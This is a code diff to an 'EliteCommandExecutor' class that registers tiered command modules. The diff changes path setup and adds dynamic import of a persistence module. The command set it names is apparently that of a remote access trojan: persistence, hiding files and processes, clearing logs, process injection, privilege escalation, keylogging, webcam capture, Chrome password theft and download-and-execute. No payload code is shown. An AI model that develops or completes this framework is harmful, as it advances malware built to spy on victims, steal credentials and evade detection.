@@ -113,9 +113,15 @@ class EliteCommandExecutor:
         import sys
         import os
         
+        # Add the elite_commands directory to Python path
         commands_path = os.path.join(os.path.dirname(__file__), 'elite_commands')
         if commands_path not in sys.path:
             sys.path.insert(0, commands_path)
+        
+        # Also add the Core directory for relative imports
+        core_path = os.path.dirname(__file__)
+        if core_path not in sys.path:
+            sys.path.insert(0, core_path)
     
     def _load_tier1_commands(self):
         """Load Tier 1 elite commands"""
@@ -190,46 +196,32 @@ class EliteCommandExecutor:
     
     def _load_tier3_commands(self):
         """Load Tier 3 elite commands (stealth & persistence)"""
-        tier3_commands = {
-            'persistence': 'elite_persistence',
-            'unpersistence': 'elite_unpersistence',
-            'hidefile': 'elite_hidefile',
-            'unhidefile': 'elite_unhidefile',
-            'hideprocess': 'elite_hideprocess',
-            'unhideprocess': 'elite_unhideprocess',
-            'clearlogs': 'elite_clearlogs',
-            'firewall': 'elite_firewall',
-            'migrate': 'elite_migrate'
-        }
+        # Only load commands that aren't already loaded in Tier 1
+        tier3_commands = [
+            ('persistence', 'elite_persistence', 'elite_persistence'),
+        ]
         
-        for cmd_name, module_name in tier3_commands.items():
-            # Will be implemented - for now use placeholders
-            self.commands[cmd_name] = self._placeholder_command(cmd_name)
+        for cmd_name, module_name, func_name in tier3_commands:
+            if cmd_name not in self.commands:  # Don't overwrite Tier 1 commands
+                try:
+                    module = __import__(module_name)
+                    func = getattr(module, func_name)
+                    self.commands[cmd_name] = func
+                    print(f"✅ Loaded {cmd_name} command")
+                except Exception as e:
+                    self.commands[cmd_name] = self._placeholder_command(cmd_name)
+                    print(f"⚠️ Failed to load {cmd_name}: {e}")
     
     def _load_tier4_commands(self):
         """Load Tier 4 elite commands (advanced features)"""
-        tier4_commands = {
-            'inject': 'elite_inject',
-            'port_forward': 'elite_port_forward',
-            'socks_proxy': 'elite_socks_proxy',
-            'escalate': 'elite_escalate',
-            'vmscan': 'elite_vmscan'
-        }
-        
-        for cmd_name, module_name in tier4_commands.items():
-            # Will be implemented - for now use placeholders
-            self.commands[cmd_name] = self._placeholder_command(cmd_name)
-        
-        # Add remaining placeholder commands that aren't implemented yet
-        remaining_commands = [
-            'cd', 'pwd', 'cat', 'rm', 'mkdir', 'rmdir', 'mv', 'cp',
-            'systeminfo', 'whoami', 'hostname', 'username', 'privileges', 'network', 'processes', 'installedsoftware',
-            'hidecmd', 'unhidecmd', 'hideprocess', 'unhideprocess', 'hidefile', 'unhidefile', 'hidereg', 'unhidereg',
-            'askpass', 'migrate', 'inject', 'shutdown', 'restart', 'screenrec', 'webcam', 'stopkeylogger',
+        # Only add placeholder commands that don't exist yet
+        placeholder_commands = [
+            'socks_proxy', 'hidecmd', 'unhidecmd', 'unhidefile', 'unhideprocess', 'hidereg', 'unhidereg',
+            'askpass', 'shutdown', 'restart', 'screenrec', 'webcam', 
             'viewlogs', 'ssh', 'sudo', 'download_exec', 'upload_exec', 'chromepasswords'
         ]
         
-        for cmd in remaining_commands:
+        for cmd in placeholder_commands:
             if cmd not in self.commands:  # Don't overwrite loaded commands
                 self.commands[cmd] = self._placeholder_command(cmd)
         
